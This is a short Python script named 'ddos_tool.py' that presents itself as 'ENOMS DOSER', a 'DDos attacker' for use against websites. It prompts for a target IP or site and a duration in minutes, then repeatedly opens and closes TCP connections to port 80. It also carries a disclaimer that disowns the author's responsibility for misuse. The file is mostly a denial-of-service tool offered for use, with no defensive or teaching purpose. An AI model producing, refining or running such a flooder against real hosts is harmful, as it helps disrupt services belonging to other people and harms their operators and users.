# ddos_tool.py
import socket
import time

def attack(target, duration):
    timeout = time.time() + duration * 60
    while time.time() < timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            s.connect((target, 80))
            print("Successfully plagued! 🤢🦠")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            s.close()
    print("Attack completed.")

def main():
    print ("WELCOME TO ENOMS DOSER")
    print ("this is plauge DDos attacker")
    print ("used to infect sites")
    print ("anything you do is not the owners fault")
    target = input("Enter the target IP or website: ")
    duration = int(input("Enter the duration in minutes: "))
    
    print(f"Starting attack on {target} for {duration} minutes. Press Ctrl+C to stop.")
    try:
        attack(target, duration)
    except KeyboardInterrupt:
        print("Attack stopped by user.")

if __name__ == "__main__":
    main()
